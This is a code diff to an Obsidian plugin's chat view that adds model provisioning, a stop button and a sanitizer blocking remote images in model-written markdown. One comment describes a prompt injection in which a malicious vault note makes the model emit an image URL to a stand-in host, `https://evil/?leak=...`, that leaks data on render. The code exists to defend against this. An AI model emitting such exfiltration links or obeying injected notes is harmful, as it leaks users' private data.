@@ -16,8 +16,24 @@ export class QvacView extends ItemView {
   // chat
   private history: { role: string; content: string }[] = [];
   private chatBusy = false;
+  private chatAbort = false; // Stop button: ignore further tokens for the current turn
 
   constructor(leaf: WorkspaceLeaf, private plugin: QvacPlugin) { super(leaf); }
+
+  // Neutralize REMOTE images/HTML in LLM-authored markdown before rendering. Obsidian auto-loads
+  // remote images, so a malicious note in the grounding could make the model emit
+  // `![](https://evil/?leak=...)` which fires an outbound request on render - breaking the
+  // "nothing leaves your machine" guarantee. Local/vault images (relative, ![[...]], app://) are kept.
+  private sanitizeLlmMarkdown(md: string): string {
+    return String(md || "")
+      .replace(/!\[([^\]]*)\]\(\s*(https?:)?\/\/[^)]*\)/gi, "`[remote image blocked]`") // markdown remote image
+      .replace(/<img\b[^>]*>/gi, "`[remote image blocked]`");                            // raw <img> (renderer allows some HTML)
+  }
+  // Render markdown into an element (empty + render), throttled so streaming doesn't re-render per token.
+  private async renderMd(el: HTMLElement, md: string) {
+    el.empty();
+    await MarkdownRenderer.render(this.app, this.sanitizeLlmMarkdown(md) || "…", el, "", this);
+  }
   getViewType() { return VIEW_TYPE_QVAC; }
   getDisplayText() { return "QVAC"; }
   getIcon() { return "bot"; }
@@ -73,10 +89,44 @@ export class QvacView extends ItemView {
     this.tab = tab;
     for (const el of Array.from(this.tabsEl.children)) (el as HTMLElement).toggleClass("active", (el as HTMLElement).dataset.tab === tab);
     this.bodyEl.empty();
+    // Until the models are downloaded, every tab shows the one-time Setup panel (no silent multi-GB
+    // download inside a chat/index timeout).
+    if (!this.plugin.isProvisioned()) { this.renderSetup(); return; }
     if (tab === "chat") this.renderChat();
     else if (tab === "search") this.renderSearch();
     else if (tab === "connect") this.renderConnect();
     else if (tab === "train") this.renderTrain();
+  }
+
+  // ---------- SETUP (first-run provisioning) ----------
+  private renderSetup() {
+    const wrap = this.bodyEl.createDiv({ cls: "qvac-setup" });
+    wrap.createDiv({ cls: "qvac-train-title", text: "Set up QVAC" });
+    wrap.createDiv({ cls: "qvac-train-desc", text: "Downloads the local AI models (~4.5 GB: a chat model + an embeddings model) into ~/.qvac. This runs once and happens entirely on your machine - nothing leaves it. Search and Connect work as soon as the small embeddings model lands." });
+    const btn = wrap.createEl("button", { cls: "qvac-btn-primary", text: "Download & set up" });
+    const status = wrap.createDiv({ cls: "qvac-train-status" });
+    const barWrap = wrap.createDiv({ cls: "qvac-bar hidden" });
+    const bar = barWrap.createDiv({ cls: "qvac-bar-fill" });
+    btn.onclick = async () => {
+      btn.disabled = true; barWrap.removeClass("hidden"); status.setText("Starting download…");
+      try {
+        const res = await this.plugin.provision((f: any) => {
+          if (f.type === "provision.progress") {
+            const p = f.percentage;
+            status.setText(`Downloading ${f.model === "embed" ? "embeddings" : "chat"} model${p != null ? ` · ${Math.round(p)}%` : "…"}`);
+            if (p != null) bar.style.width = Math.max(2, Math.round(p)) + "%";
+          }
+        });
+        if (res.ok) {
+          await this.plugin.markProvisioned();
+          status.setText("Done. Indexing your vault…");
+          this.plugin.indexVault(false);
+          new Notice("QVAC is ready.");
+          this.setTab(this.tab); // re-render the real tab now that we're provisioned
+        } else status.setText("Setup failed: " + (res.error || "unknown"));
+      } catch (e: any) { status.setText("Setup failed: " + (e?.message || e)); }
+      finally { btn.disabled = false; }
+    };
   }
 
   // ---------- CHAT ----------
@@ -100,33 +150,46 @@ export class QvacView extends ItemView {
     const inputRow = wrap.createDiv({ cls: "qvac-input" });
     const ta = inputRow.createEl("textarea", { attr: { rows: "1", placeholder: "Ask your vault…" } });
     ta.addEventListener("input", () => { ta.style.height = "auto"; ta.style.height = Math.min(ta.scrollHeight, 140) + "px"; });
-    ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } });
+    ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); this.chatBusy ? stop() : send(); } });
     const sendBtn = inputRow.createEl("button", { cls: "qvac-send" }); setIcon(sendBtn, "arrow-up");
+    const setBtn = (busy: boolean) => { sendBtn.empty(); setIcon(sendBtn, busy ? "square" : "arrow-up"); sendBtn.toggleClass("stop", busy); sendBtn.setAttr("aria-label", busy ? "Stop" : "Send"); };
+    const stop = () => { if (this.chatBusy) this.chatAbort = true; };
     const send = async () => {
       const q = ta.value.trim(); if (!q || this.chatBusy) return;
-      ta.value = ""; ta.style.height = "auto"; this.chatBusy = true;
+      ta.value = ""; ta.style.height = "auto"; this.chatBusy = true; this.chatAbort = false; setBtn(true);
       this.renderMsg(messages, "user", q, []);
       const body = this.renderMsg(messages, "assistant", "", []);
       const bodyText = body.querySelector(".qvac-msg-body") as HTMLElement;
       bodyText.addClass("qvac-typing"); bodyText.setText("…");
-      let acc = "", hits: any[] = [];
+      let acc = "", hits: any[] = [], lastRender = 0;
+      const paint = (final = false) => {
+        const now = Date.now();
+        if (!final && now - lastRender < 150) return; // throttle markdown re-render during streaming
+        lastRender = now; bodyText.removeClass("qvac-typing");
+        this.renderMd(bodyText, acc); messages.scrollTop = messages.scrollHeight;
+      };
       try {
         const res = await this.plugin.chat(q, this.history, (f: any) => {
+          if (this.chatAbort) return;
           if (f.type === "chat.start") hits = f.hits || [];
-          else if (f.type === "chat.token") { acc += f.text; bodyText.removeClass("qvac-typing"); bodyText.setText(acc); messages.scrollTop = messages.scrollHeight; }
+          else if (f.type === "chat.token") { acc += f.text; paint(); }
+          else if (f.type === "chat.error") { acc += (acc ? "\n\n" : "") + "_Error: " + (f.error || "unknown") + "_"; paint(true); }
         });
-        if (res.ok) {
+        if (this.chatAbort) {
+          acc += (acc ? "\n\n" : "") + "_(stopped)_";
+          await this.renderMd(bodyText, acc);
+          this.history.push({ role: "user", content: q }); this.history.push({ role: "assistant", content: acc });
+        } else if (res.ok) {
           acc = res.data?.contentText || acc; hits = res.data?.hits || hits;
-          bodyText.removeClass("qvac-typing"); bodyText.empty();
-          await MarkdownRenderer.render(this.app, acc || "(no answer)", bodyText, "", this);
+          await this.renderMd(bodyText, acc || "(no answer)");
           this.renderCites(body, hits);
           this.history.push({ role: "user", content: q }); this.history.push({ role: "assistant", content: acc });
           if (res.data?.model?.includes("voice")) body.createDiv({ cls: "qvac-msg-model", text: "answered from your vault model" });
-        } else bodyText.setText("Error: " + (res.error || "unknown"));
-      } catch (e: any) { bodyText.setText("Error: " + (e?.message || e)); }
-      finally { this.chatBusy = false; messages.scrollTop = messages.scrollHeight; }
+        } else { bodyText.removeClass("qvac-typing"); bodyText.setText("Error: " + (res.error || "unknown")); }
+      } catch (e: any) { bodyText.removeClass("qvac-typing"); bodyText.setText("Error: " + (e?.message || e)); }
+      finally { this.chatBusy = false; this.chatAbort = false; setBtn(false); messages.scrollTop = messages.scrollHeight; }
     };
-    sendBtn.onclick = send;
+    sendBtn.onclick = () => { this.chatBusy ? stop() : send(); };
     setTimeout(() => ta.focus(), 0);
   }
   private renderMsg(container: HTMLElement, role: "user" | "assistant", text: string, hits: any[]): HTMLElement {
@@ -180,6 +243,7 @@ export class QvacView extends ItemView {
 
   // ---------- CONNECT (related notes + create the missing [[links]]) ----------
   private async renderConnect() {
+    this.bodyEl.empty(); // the file-open handler calls this directly; without empty it stacks a new panel per note switch
     const wrap = this.bodyEl.createDiv({ cls: "qvac-connect" });
     wrap.createDiv({ cls: "qvac-connect-intro", text: "Obsidian only knows the [[links]] you type. Connect finds notes that belong together but are not linked yet, and writes the link for you." });
 
